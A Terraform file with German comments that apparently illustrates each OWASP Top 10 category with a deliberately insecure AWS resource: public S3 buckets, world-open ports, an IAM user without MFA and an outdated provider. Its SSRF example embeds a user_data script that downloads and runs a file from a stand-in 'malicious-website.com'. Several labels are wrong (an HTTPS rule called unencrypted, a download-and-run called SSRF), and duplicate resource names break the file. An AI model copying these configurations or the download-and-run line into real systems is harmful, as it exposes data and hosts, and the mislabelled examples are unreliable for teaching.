# Broken Access Control
# Hier wird ein AWS S3-Bucket erstellt, der öffentlichen Lesezugriff ermöglicht.
# Dies ist ein Beispiel für eine defekte Zugriffskontrolle.
resource "aws_s3_bucket" "example" {
  bucket = "broken-access-control-bucket"
  acl    = "public-read"
}

# Cryptographic Failures
# Hier wird eine AWS Security Group-Regel erstellt, die den eingehenden Verkehr auf Port 443 (HTTPS) erlaubt.
# Das Problem hier ist, dass keine Verschlüsselung aktiviert ist, was ein Beispiel für kryptografische Schwächen ist.
resource "aws_security_group_rule" "example" {
  type        = "ingress"
  from_port   = 443
  to_port     = 443
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

# Injection
# Hier wird eine AWS EC2-Instanz erstellt, und im user_data-Feld wird unsicherer Benutzereingabecode eingefügt.
# Dies ist ein Beispiel für eine Injection-Schwachstelle.
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  user_data     = "<script>alert('Injection')</script>"
}

# Insecure Design
# Hier wird eine AWS Security Group erstellt, die den eingehenden Verkehr auf Port 8080 erlaubt.
# Das Problem hier ist, dass dieser Port ohne klaren Geschäftsgrund geöffnet ist, was ein Beispiel für ein unsicheres Design ist.
resource "aws_security_group" "example" {
  name        = "example"
  description = "Example security group"
  ingress {
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Security Misconfiguration
# Hier wird ein AWS S3-Bucket erstellt, dessen Berechtigungen falsch konfiguriert wurden.
# Dies ermöglicht authentifizierten Benutzern Lesezugriff, was ein Beispiel für Probleme bei der Sicherheitskonfiguration ist.
resource "aws_s3_bucket" "example" {
  bucket = "misconfigured-bucket"
  acl    = "authenticated-read"
}

# Vulnerable and Outdated Components
# Hier wird der AWS-Provider für Terraform mit einer veralteten Version konfiguriert.
# Dies ist ein Beispiel für verwundbare und veraltete Komponenten.
provider "aws" {
  region  = "us-east-1"
  version = "~> 1.0"
}

# Identification and Authentication Failures
# Hier wird ein AWS IAM-Benutzer erstellt, der keine Multi-Faktor-Authentifizierung (MFA) aktiviert hat.
# Dies ist ein Beispiel für Identifikations- und Authentifizierungsprobleme.
resource "aws_iam_user" "example" {
  name = "example-user"
  force_destroy = true
}

# Software and Data Integrity Failures
# Hier wird eine AWS EC2-Instanz erstellt, und die Integrität des AMIs wird nicht überprüft.
# Dies ist ein Beispiel für Probleme mit der Integrität von Software und Daten.
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  source_dest_check = false
}

# Security Logging and Monitoring Failures
# Hier wird eine AWS CloudWatch Log Group erstellt, die nicht angemessen für Überwachung und Protokollierung konfiguriert ist.
# Dies ist ein Beispiel für Probleme bei der Sicherheitsprotokollierung und -überwachung.
resource "aws_cloudwatch_log_group" "example" {
  name              = "insecure-log-group"
  retention_in_days = 1
}

# Server Side Request Forgery (SSRF)
# Hier wird eine AWS EC2-Instanz erstellt, und im user_data-Feld wird ein bösartiger Befehl eingefügt, der von einer externen Website heruntergeladen und ausgeführt wird.
# Dies ist ein Beispiel für eine Serverseitige Anfragenfälschung (SSRF).
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  user_data     = "#!/bin/bash\nwget http://malicious-website.com/malware -O /tmp/malware.sh\nbash /tmp/malware.sh"
}

